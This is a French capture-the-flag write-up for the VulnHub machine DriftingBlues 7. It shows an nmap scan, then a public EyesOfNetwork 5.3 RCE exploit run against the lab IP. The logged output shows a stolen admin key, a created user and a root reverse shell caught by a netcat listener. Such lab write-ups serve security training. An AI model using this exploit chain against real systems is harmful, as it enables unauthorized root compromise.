# Solution du CTF DriftingBlues #7 de VulnHub

No bullshit
-----------

Attaquons [le 7ème opus](https://www.vulnhub.com/entry/driftingblues-7,680/) de cette saga de CTF. Comme vous le verrez ça va être très succin.  

```plain
Not shown: 65527 closed tcp ports (reset) 
PORT     STATE SERVICE         VERSION 
22/tcp   open  ssh             OpenSSH 7.4 (protocol 2.0) 
| ssh-hostkey:  
|   2048 c4:fa:e5:5f:88:c1:a1:f0:51:8b:ae:e3:fb:c1:27:72 (RSA) 
|   256 01:97:8b:bf:ad:ba:5c:78:a7:45:90:a1:0a:63:fc:21 (ECDSA) 
|_  256 45:28:39:e0:1b:a8:85:e0:c0:b0:fa:1f:00:8c:5e:d1 (ED25519) 
66/tcp   open  http            SimpleHTTPServer 0.6 (Python 2.7.5) 
|_http-title: Scalable Cost Effective Cloud Storage for Developers 
|_http-server-header: SimpleHTTP/0.6 Python/2.7.5 
80/tcp   open  http            Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3) 
|_http-title: Did not follow redirect to https://192.168.56.12/ 
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3 
111/tcp  open  rpcbind         2-4 (RPC #100000) 
| rpcinfo:  
|   program version    port/proto  service 
|   100000  2,3,4        111/tcp   rpcbind 
|   100000  2,3,4        111/udp   rpcbind 
|   100000  3,4          111/tcp6  rpcbind 
|_  100000  3,4          111/udp6  rpcbind 
443/tcp  open  ssl/http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3) 
| http-title: EyesOfNetwork 
|_Requested resource was /login.php## 
| ssl-cert: Subject: commonName=localhost/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- 
| Not valid before: 2021-04-03T14:37:22 
|_Not valid after:  2022-04-03T14:37:22 
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3 
|_ssl-date: TLS randomness does not represent time 
2403/tcp open  taskmaster2000? 
3306/tcp open  mysql           MariaDB (unauthorized) 
8086/tcp open  http            InfluxDB http admin 1.7.9 
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
```

Il y a une appli web qui s'appelle *EyesOfNetwork* servie sur le port 443. Je ne savais même pas que ça existait mais il existe [un exploit](https://www.exploit-db.com/exploits/48025) de [Clément Billac](https://twitter.com/h4knet) pour une vulnérabilité RCE.  

L'exploit en question semble exploiter 3 CVEs pour parvenir à ses fins. Voyons ce que ça donne :  

```plain
$ python /tmp/eonrce.py https://192.168.56.12/ -ip 192.168.56.1 -port 9999 
+-----------------------------------------------------------------------------+ 
| EyesOfNetwork 5.3 RCE (API v2.4.2)                                          | 
| 02/2020 - Clément Billac Twitter: @h4knet                                  | 
+-----------------------------------------------------------------------------+ 

[*] EyesOfNetwork login page found 
[*] EyesOfNetwork API page found. API version: 2.4.2 
[+] Admin user key obtained: 49dc21d3dc692e2341e6c6b075b1fad4a9a69bbcc6a63f8886252be7f1c6454d 
[+] New user h4ker successfully created. ID:2 
[+] Successfully authenticated 
[+] Discovery job successfully created with ID: 1&amp;review=1" id="completemsg" style="display: none;"> 
<div class="roundedcorner_success_box"> 
<div class="roundedcorner_success_top"><div></div></div> 
<div class="roundedcorner_success_content"> 
              Auto-Discovery Complete.  Click to Continue To Reviewing Found Devices 
              </div> 
<div class="roundedcorner_success_bottom"><div></div></div> 
</div></a> 
[*]  Spawning netcat listener:  
Listening on 192.168.56.1 9999 
Connection received on 192.168.56.12 43406 
sh: no job control in this shell 
sh-4.2# id 
id 
uid=0(root) gid=0(root) groups=0(root) 
sh-4.2# cd /root 
cd /root 
sh-4.2# ls -al 
ls -al 
total 72 
dr-xr-x---.  4 root root  4096 Apr  3  2021 . 
dr-xr-xr-x. 19 root root  4096 Apr  7  2021 .. 
-rw-------   1 root root   319 Apr  7  2021 .bash_history 
-rw-r--r--.  1 root root   176 Dec 28  2013 .bash_profile 
-rw-r--r--.  1 root root   100 Dec 28  2013 .cshrc 
drwxr-----.  3 root root  4096 Apr  3  2021 .pki 
-rw-r--r--.  1 root root   129 Dec 28  2013 .tcshrc 
-rw-------.  1 root root  1401 Apr  3  2021 anaconda-ks.cfg 
-rwxr-xr-x.  1 root root   248 Apr  3  2021 eon 
-rw-r--r--   1 root root  1823 Apr  3  2021 flag.txt 
-rw-r--r--   1 root root 17477 Apr  7  2021 index.htm 
drwxr-xr-x.  2 root root  4096 Apr  3  2021 index_files 
-rw-r--r--   1 root root   514 Feb  7  2021 logdel2 
-rwxr-xr-x.  1 root root    52 Apr  3  2021 upit.sh 
sh-4.2# cat flag.txt 
cat flag.txt 
flag 1/1 
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄ 
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄ 
░░░░█░░░░░░░░░░░░░░░░░░░░░░█ 
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█ 
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█ 
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█ 
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█ 
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█ 
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█ 
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█ 
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█ 
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█ 
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█ 
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█ 
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█ 
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀ 
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄ 
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█ 
░░█░░▌░█░░█░░█░░░█░░█░░█ 
░░█░░▀▀░░██░░█░░░█░░█░░█ 
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█ 

congratulations!
```

Voilà voilà... C'est terminé. A noter que le port 66 fait tourner le serveur HTTP builtin de Python depuis le dossier de root du coup via énumération on peut aussi obtenir le flag.

*Published January 21 2022 at 12:04*